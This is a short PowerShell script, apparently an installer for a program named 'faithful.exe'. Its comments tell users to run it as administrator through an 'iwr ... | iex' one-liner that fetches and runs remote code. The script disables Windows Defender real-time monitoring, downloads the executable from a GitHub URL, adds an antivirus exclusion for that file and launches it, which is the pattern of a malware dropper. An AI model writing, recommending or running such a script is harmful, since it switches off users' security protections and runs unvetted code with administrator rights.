# Run this script as an administrator : Run powershell as admin before executing.
# Command to execute:
# iwr a.faithful.cf | iex

cd $env:userprofile
Set-MpPreference -DisableRealtimeMonitoring $true
Write-Output "Starting script..."
Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "faithful.exe"
Write-Output "Adding Windows Defender exclusion..."
Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\faithful.exe"
Start-Process ("faithful.exe")
Write-Output "Done!"
